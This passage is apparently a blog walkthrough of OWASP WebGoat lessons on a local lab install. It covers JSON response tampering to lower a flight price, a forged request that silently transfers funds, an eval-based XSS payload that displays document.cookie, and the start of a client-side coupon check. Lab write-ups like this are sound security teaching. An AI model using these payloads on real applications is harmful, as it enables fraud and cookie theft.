<p><strong>JSON Injection</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform JSON Injection Attacks.</p>

<p><strong>How the attack works:</strong>
JavaScript Object Notation (JSON) is a simple and effective lightweight data exchange format. JSON can be in a lot of forms such as arrays, lists, hashtables and other data structures. JSON is widely used in AJAX and Web2.0 applications and is favored by programmers over XML because of its ease of use and speed. However, JSON, like XML, is prone to Injection attacks. A malicious attacker can inject the reply from the server and inject some arbitrary values in there.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/json_injection.png" title="json injection" alt="json injection"></p>

<p>Intercept the response and modify the no stops flight in the following JSON to a lower price:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="p">{</span>
</span><span class='line'><span class="nt">&quot;From&quot;</span><span class="p">:</span> <span class="s2">&quot;Boston&quot;</span><span class="p">,</span>
</span><span class='line'><span class="nt">&quot;To&quot;</span><span class="p">:</span> <span class="s2">&quot;Seattle&quot;</span><span class="p">,</span>
</span><span class='line'><span class="nt">&quot;flights&quot;</span><span class="p">:</span> <span class="p">[</span>
</span><span class='line'><span class="p">{</span><span class="nt">&quot;stops&quot;</span><span class="p">:</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="nt">&quot;transit&quot;</span> <span class="p">:</span> <span class="s2">&quot;N/A&quot;</span><span class="p">,</span> <span class="nt">&quot;price&quot;</span><span class="p">:</span> <span class="s2">&quot;$600&quot;</span><span class="p">},</span>
</span><span class='line'><span class="p">{</span><span class="nt">&quot;stops&quot;</span><span class="p">:</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span> <span class="nt">&quot;transit&quot;</span> <span class="p">:</span> <span class="s2">&quot;Newark,Chicago&quot;</span><span class="p">,</span> <span class="nt">&quot;price&quot;</span><span class="p">:</span> <span class="s2">&quot;$300&quot;</span><span class="p">}</span>
</span><span class='line'><span class="p">]</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then selecy your now very cheap flight and you&rsquo;re done.</p>

<p><strong>Silent Transactions Attacks</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform silent transactions attacks.</p>

<p><strong>How the attack works:</strong>
Any system that silently processes transactions using a single submission is dangerous to the client. For example, if a normal web application allows a simple URL submission, a preset session attack will allow the attacker to complete a transaction without the user&rsquo;s authorization. In Ajax, it gets worse: the transaction is silent; it happens with no user feedback on the page, so an injected attack script may be able to steal money from the client without authorization.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/silent.png" title="silent transaction attack" alt="silent transaction attack"></p>

<p>Find the following Javascript code in the source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">function</span> <span class="nx">processData</span><span class="p">(){</span>
</span><span class='line'> <span class="kd">var</span> <span class="nx">accountNo</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;newAccount&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</span><span class='line'> <span class="kd">var</span> <span class="nx">amount</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;amount&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</span><span class='line'> <span class="k">if</span> <span class="p">(</span> <span class="nx">accountNo</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
</span><span class='line'> <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Please enter a valid account number to transfer to.&#39;</span><span class="p">)</span>
</span><span class='line'> <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="nx">amount</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
</span><span class='line'> <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Please enter a valid amount to transfer.&#39;</span><span class="p">)</span>
</span><span class='line'> <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'> <span class="kd">var</span> <span class="nx">balanceValue</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;balanceID&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">;</span>
</span><span class='line'> <span class="nx">balanceValue</span> <span class="o">=</span> <span class="nx">balanceValue</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="p">)</span> <span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span><span class='line'> <span class="k">if</span> <span class="p">(</span> <span class="nb">parseFloat</span><span class="p">(</span><span class="nx">amount</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">parseFloat</span><span class="p">(</span><span class="nx">balanceValue</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'> <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;You can not transfer more funds than what is available in your balance.&#39;</span><span class="p">)</span>
</span><span class='line'> <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;confirm&#39;</span><span class="p">).</span><span class="nx">value</span>  <span class="o">=</span> <span class="s1">&#39;Transferring&#39;</span>
</span><span class='line'><span class="nx">submitData</span><span class="p">(</span><span class="nx">accountNo</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
</span><span class='line'> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;confirm&#39;</span><span class="p">).</span><span class="nx">value</span>  <span class="o">=</span> <span class="s1">&#39;Confirm&#39;</span>
</span><span class='line'><span class="nx">balanceValue</span> <span class="o">=</span> <span class="nb">parseFloat</span><span class="p">(</span><span class="nx">balanceValue</span><span class="p">)</span> <span class="o">-</span> <span class="nb">parseFloat</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
</span><span class='line'><span class="nx">balanceValue</span> <span class="o">=</span> <span class="nx">balanceValue</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;balanceID&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">balanceValue</span> <span class="o">+</span> <span class="s1">&#39;$&#39;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kd">function</span> <span class="nx">submitData</span><span class="p">(</span><span class="nx">accountNo</span><span class="p">,</span> <span class="nx">balance</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=&#39;</span><span class="o">+</span> <span class="nx">accountNo</span><span class="o">+</span> <span class="s1">&#39;&amp;amount=&#39;</span> <span class="o">+</span> <span class="nx">balance</span> <span class="o">+</span><span class="s1">&#39;&amp;confirm=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;confirm&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">XMLHttpRequest</span> <span class="o">!=</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">ActiveXObject</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s1">&#39;Microsoft.XMLHTTP&#39;</span><span class="p">);</span>
</span><span class='line'>   <span class="p">}</span>
</span><span class='line'>   <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span><span class='line'>   <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nx">callback</span><span class="p">;</span>
</span><span class='line'>   <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kd">function</span> <span class="nx">callback</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                   <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span>  <span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span> <span class="p">;</span>
</span><span class='line'>           <span class="kd">var</span> <span class="nx">resultsDiv</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;resultsDiv&#39;</span><span class="p">);</span>
</span><span class='line'>              <span class="nx">resultsDiv</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>              <span class="nx">resultsDiv</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">result</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}}}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The function <em>processData</em> performs some validation, such as correct account number, valid amount and balance. If all is well, it calls <em>submitData</em>, which is the function that does the transaction. The following line is the key to performing the attack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=&#39;</span><span class="o">+</span> <span class="nx">accountNo</span><span class="o">+</span> <span class="s1">&#39;&amp;amount=&#39;</span> <span class="o">+</span> <span class="nx">balance</span> <span class="o">+</span><span class="s1">&#39;&amp;confirm=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;confirm&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then all we need to do is construct a URL like that with our chosen parameters:</p>

<p><code><a href="http://localhost:8080/WebGoat/attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=83&amp;amount=20000&amp;confirm=Confirm">http://localhost:8080/WebGoat/attack?Screen=68&amp;menu=400&amp;from=ajax&amp;newAccount=83&amp;amount=20000&amp;confirm=Confirm</a></code></p>

<p>Another way would be to use Javascript in the browser to call the function <em>submitData</em> directly with arbitrary values:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>javascript:submitData(83,20000);</span></code></pre></td></tr></table></div></figure>


<p>In my Firefox version, I couldn&rsquo;t use Javascript from the URL bar, so I used Scratchpad instead from the Web Developer tools.</p>

<p><strong>Dangerous Use of Eval</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is reflected directly into an HTTP response. In this lesson, unvalidated user-supplied data is used in conjunction with a Javascript eval() call. In a reflected XSS attack, an attacker can craft a URL with the attack script and store it on another website, email it, or otherwise trick a victim into clicking on it.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/eval.png" title="eval danger" alt="eval"></p>

<p>At first I was stuck because I couldn&rsquo;t quite grasp what the code was doing and where was the vulnerability, so I looked at the solution and worked backwards from there, and it became clearer, or at least I think it did.</p>

<p>The first thing I did was look at the <code>eval.js</code> code. And below is the important part.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">http_request</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">http_request</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">status</span> <span class="o">=</span> <span class="nx">http_request</span><span class="p">.</span><span class="nx">status</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">responseText</span> <span class="o">=</span> <span class="nx">http_request</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
</span><span class='line'>                  
</span><span class='line'><span class="c1">//alert(&#39;status: &#39; + status);</span>
</span><span class='line'><span class="c1">//alert(&#39;responseText: &#39; + responseText);</span>
</span><span class='line'>                  
</span><span class='line'><span class="nb">eval</span><span class="p">(</span><span class="nx">http_request</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>                 
</span><span class='line'>      
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;&#39;);&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'><span class="o">&amp;&amp;</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;alert&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'><span class="o">&amp;&amp;</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;document.cookie&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span><span class='line'>                  
</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>                  
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>And in the <code>eval.jsp</code> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nb">String</span> <span class="nx">action</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;action&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nb">String</span> <span class="nx">field1</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;field1&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nb">String</span> <span class="nx">field2</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;field2&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">action</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="nx">action</span> <span class="o">=</span> <span class="s2">&quot;Purchase&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">field1</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="nx">field1</span> <span class="o">=</span> <span class="s2">&quot;123&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">field2</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="nx">field2</span> <span class="o">=</span> <span class="s2">&quot;-1&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/** If they supplied the right attack, pass them **/</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">field1</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;&#39;);&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">field1</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;alert&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">field1</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;document.cookie&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="nx">session</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="nx">DangerousEval</span><span class="p">.</span><span class="nx">PASSED</span><span class="p">,</span> <span class="s2">&quot;true&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">out</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;alert(&#39;Whoops: You entered an incorrect access code of \&quot;&quot;</span> <span class="o">+</span> <span class="nx">field1</span> <span class="o">+</span> <span class="s2">&quot;\&quot;&#39;);&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, some clarification to help understand the code:</p>

<ul>
<li><p>The <strong>XMLHttpRequest</strong> object is used to exchange data with a server behind the scenes, and it is heavily used in AJAX programming</p></li>
<li><p><strong>responseText</strong> is a property of the <em>XMLHttpRequest</em> object that returns the body of the server&rsquo;s response as a string.</p></li>
<li><p>The <strong>indexOf()</strong> method returns the position of the first occurrence of a specified value in a string. This method returns -1 if the value to search for never occurs. Its syntax is <code>string.indexOf(searchvalue,start)</code>. The second parameter is optional, in case you want to give a position from where to start the search.</p></li>
<li><p><em>field1</em> refers to the box with the 3 digit access code</p></li>
</ul>


<p>In light of this information, let&rsquo;s look again at this code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">field1</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;&#39;);&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">field1</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;alert&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">field1</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;document.cookie&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, this looks in field1, which is the access code, for the occurrence of <code>&lsquo;);</code>, the occurrence of the string &ldquo;alert&rdquo; and the occurrence of &ldquo;document.cookie&rdquo;. And we know what we have to use the vulnerable field to alert the cookie. First, let&rsquo;s see how the value is encapsulated. I passed the value of 12, which wouldn&rsquo;t meet the 3 digit requirement, and this is the popup that I got in return: <code>Whoops: You entered an incorrect access code of &ldquo;12&rdquo;</code></p>

<p>At first, I was like, yeah I got it, and did this:</p>

<p><code>&lsquo;);alert(document.cookie);</code></p>

<p>It didn&rsquo;t work, and I traced the answer of why to this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">out</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;alert(&#39;Whoops: You entered an incorrect access code of \&quot;&quot;</span> <span class="o">+</span> <span class="nx">field1</span> <span class="o">+</span> <span class="s2">&quot;\&quot;&#39;);&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is the alert that we&rsquo;ll have to exploit in order to alert the cookie. I will remove the escaping backslashes for a better visualization below. With the dummy value 12, it looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">out</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;alert(&#39;Whoops: You entered an incorrect access code of &quot;&quot;  12  &quot;&quot;&#39;);&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the failed injection attempt, it looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">out</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;alert(&#39;Whoops: You entered an incorrect access code of &quot;&quot;  12&#39;);alert(document.cookie);  &quot;&quot;&#39;);&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>There is a stray <code>&ldquo;)</code> at the end that is not closed off, breaking the query. To fix that, I adjusted it to:</p>

<p><code>&lsquo;);alert(document.cookie);(&rsquo;</code></p>

<p>Now the injection looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">out</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;alert(&#39;Whoops: You entered an incorrect access code of &quot;&quot;  12&#39;);alert(document.cookie);(&#39;  &quot;&quot;&#39;);&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Breaking it up into pieces:</p>

<p><code>alert(&lsquo;Whoops: You entered an incorrect access code of &ldquo;&rdquo;  12&rsquo;);</code></p>

<p><code>alert(document.cookie);</code></p>

<p><code>(&lsquo;  &ldquo;&rdquo;&rsquo;)</code></p>

<p>Now everything is closed nicely, and the injection succeeds. After the first popup with the <em>Whoops: You entered an incorrect access code of &ldquo;12</em>, you get the second alert with the cookie.</p>

<p>This ended up as a very long explanation, and I hope I got it right. Looking at the solution initially, I had no idea why it worked, but after poring over the code, it became clearer. And all this is possible because the attacker controlled string is passed directly to the <em>eval()</em> function, with no sanitization taking place.</p>

<p><strong>Insecure Client Storage</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all input on the server side. Leaving the mechanism for validation on the client side leaves it vulnerable to reverse engineering. Remember, anything on the client side should not be considered a secret.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/client_storage.png" title="insecure client storage" alt="insecure client storage"></p>

<p>Look inside <code>clientSideValidation.js</code> for the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">var</span> <span class="nx">coupons</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;nvojubmq&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;emph&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;sfwmjt&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;faopsc&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;fopttfsq&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;pxuttfsq&quot;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">isValidCoupon</span><span class="p">(</span><span class="nx">coupon</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="nx">coupon</span> <span class="o">=</span> <span class="nx">coupon</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">();</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">coupons</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="nx">decrypted</span> <span class="o">=</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nx">coupons</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">coupon</span> <span class="o">==</span> <span class="nx">decrypted</span><span class="p">){</span>
</span><span class='line'><span class="nx">ajaxFunction</span><span class="p">(</span><span class="nx">coupon</span><span class="p">);</span>
</span><span class='line'><span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="p">}</span>
